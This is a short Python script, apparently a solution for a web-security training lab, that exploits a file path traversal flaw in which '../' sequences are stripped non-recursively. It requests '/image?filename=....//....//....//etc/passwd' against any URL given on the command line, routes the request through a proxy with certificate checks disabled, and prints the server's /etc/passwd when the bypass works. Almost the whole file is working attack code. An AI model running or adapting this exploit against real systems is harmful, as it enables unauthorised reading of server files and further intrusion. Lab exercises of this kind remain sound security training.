import sys
import requests
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}

request_exploit = '/image?filename=....//....//....//etc/passwd'


def directory_traversal_exploit(url):
    image_url = url + request_exploit
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print("(-> Exploit successful!")
        print("(-> The following is the content of the /etc/passwd file:")
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> Exploiting file path traversal seq stripped non-recursively ...")
    directory_traversal_exploit(url)


if __name__ == "__main__":
    main()
